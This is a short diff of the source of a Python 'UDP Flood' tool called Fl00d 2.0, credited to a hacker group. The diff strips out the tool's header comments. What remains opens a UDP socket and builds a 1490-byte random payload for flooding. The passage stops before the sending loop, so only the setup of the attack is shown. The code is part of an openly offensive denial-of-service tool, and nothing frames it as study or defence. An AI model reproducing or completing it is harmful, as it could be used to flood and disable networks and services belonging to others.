@@ -1,16 +1,9 @@
-#!/system/bin/python
-#Fl00d 2.0 27-06-2017 (1:42)
-#Tool for UDP Flood
-#Authorized by DedSecTL
-#AndroSec1337 Cyber Team
 import socket, os, random, time
 
-# Color
 B = '\033[1m'
 R = '\033[31m'
 N = '\033[0m'
 
-# Code time ##################
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -18,7 +11,7 @@ minute = now.minute
 day = now.day
 month = now.month
 year = now.year
-##############################
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
